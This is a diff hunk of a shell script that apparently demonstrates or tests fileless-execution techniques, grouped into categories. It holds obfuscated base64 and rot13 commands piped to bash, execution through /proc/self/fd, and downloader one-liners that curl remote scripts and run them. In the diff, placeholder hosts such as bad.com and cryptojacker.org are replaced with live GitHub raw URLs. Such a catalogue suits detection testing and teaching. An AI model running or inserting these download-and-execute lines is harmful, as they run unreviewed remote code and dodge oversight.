@@ -30,18 +30,18 @@ echo "ZWNobyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK" | base64 -d | bash
 # 6
 bash -c "$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/b64.txt | base64 -d)"
 # 7
-bash -c "$(echo ENFUGBYY | tr A-Za-z N-ZA-Mn-za-m | base64 -d)"
+bash -c "$(echo MJAbolOVnD== | tr A-Za-z N-ZA-Mn-za-m | base64 -d)"
 # 8
 exec 8< <(openssl enc -d -base64 <<< L2Jpbi9zaCAtYyBlY2hvIGhlbGxv); bash /proc/self/fd/8
 '
 
 categories[Downloaders]='
 # 1
-curl -s http://example.com/script.sh | bash
+curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh | bash
 # 2
-exec 3< <(curl -s http://bad.com/payload.sh); bash /proc/self/fd/3
+exec 3< <(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh); bash /proc/self/fd/3
 # 3
-X=$(curl -s http://cryptojacker.org/liorpayload.py); python3 -c "$X"
+X=$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/test.py); python3 -c "$X"
 # 4
 bash -c "$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh)"
 '
